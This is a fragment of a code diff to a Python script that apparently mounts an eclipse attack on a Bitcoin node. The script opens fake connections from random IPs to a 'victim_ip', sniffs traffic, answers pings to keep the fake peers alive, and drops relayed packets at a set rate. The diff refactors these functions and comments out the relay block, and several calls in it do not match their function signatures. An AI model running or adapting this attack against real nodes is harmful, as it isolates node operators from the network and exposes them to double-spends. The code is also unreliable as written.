@@ -165,13 +165,13 @@ def make_fake_connection(src_ip, dst_ip, verbose=True):
 	except:
 		print('Error: unable to  start thread to sniff interface {interface}')
 
-def sniff(socket, src_ip, src_port, dst_ip, dst_port, interface):
+def sniff(socket, dst_ip, dst_port, src_ip, src_port, interface):
 	while True:
 		packet = socket.recv(65565)
-		packet_received(packet)
+		packet_received(packet, socket, from_ip, interface)
 
 # Called when a packet is sniffed from the network
-def packet_received(msg_raw):
+def packet_received(msg_raw, socket, from_ip, from_port, to_ip, to_port, interface):
 	if len(msg_raw) >= 4:
 		is_bitcoin = (msg_raw[0:4] == b'\xf9\xbe\xb4\xd9')
 	else:
@@ -201,13 +201,15 @@ def packet_received(msg_raw):
 	msg = MsgSerializable.from_bytes(msg_raw)
 
 	# Relay Bitcoin packets that aren't from the victim
-	if packet[IP].src == victim_ip:
-		print(f'*** Message received ** addr={packet[IP].dst} ** cmd={msg_type}')
+	if from_ip == victim_ip:
+		print(f'*** Message received ** addr={from_ip} ** cmd={msg_type}')
 
 		if msg_type == 'ping':
 			pong = msg_pong(bitcoin_protocolversion)
 			pong.nonce = msg.nonce
+			socket.send(pong.to_bytes())
 
+	""" Relaying code
 	elif packet[IP].dst == attacker_ip:
 		if len(identity_socket) > 0:
 			if random.random() > eclipse_packet_drop_rate:
@@ -240,7 +242,7 @@ def packet_received(msg_raw):
 					make_fake_connection(rand_ip, victim_ip, False) # Use old IP
 					#make_fake_connection(random_ip(), victim_ip)
 					sys.exit() # Stop the current thread that sniffs for packets on this interface
-
+	"""
 
 def initialize_network_info():
 	print('Retrieving network info...')
